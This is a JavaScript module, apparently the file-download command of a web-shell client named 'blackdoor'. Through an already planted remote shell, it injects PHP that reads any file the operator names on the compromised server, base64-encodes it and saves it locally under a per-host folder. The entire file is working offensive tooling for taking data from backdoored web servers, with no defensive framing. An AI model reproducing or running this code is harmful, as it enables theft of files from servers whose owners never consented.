var term = require('terminal-kit').terminal;
var fs = require('fs');

module.exports = download = {
    mkdirSyncRecursive : function(dir) {
        let sep = '/';

        let segments = dir.split(sep);
        let current = '';
        let i = 0;

        while (i < segments.length) {
            current = current + sep + segments[i];
            try {
                fs.statSync(current);
            } catch (e) {
                fs.mkdirSync(current);
            }

            i++;
        }
	},
	exec : async (input, raw, shell) => {

        homeDir = process.env[(process.platform === 'win32') ? 'USERPROFILE' : 'HOME']+'/.blackdoor/'+shell.hostname;

        remoteDir = shell.pwd;
        remoteDir = remoteDir.replace(/\/+$/g, '')+'/';

    	let output = await shell.call(`ob_clean();
    		header('Content-Disposition: attachment; filename=rawfile');
    		header('Content-Type: application/octet-stream');
			header('Expires: 0');
			header('Cache-Control: must-revalidate');
			header('Pragma: public');
			echo base64_encode(file_get_contents('`+remoteDir+input.args[0].value+`'));
			exit;`);
        let localDir = homeDir+remoteDir;
		download.mkdirSyncRecursive(localDir);

        fs.writeFile(localDir+input.args[0].value, output, 'base64', function (err) {
            if (err) throw err;
            term.bold.green('Saved on : '); term(localDir+input.args[0].value+"\n");

            shell.input();
        });
	}
};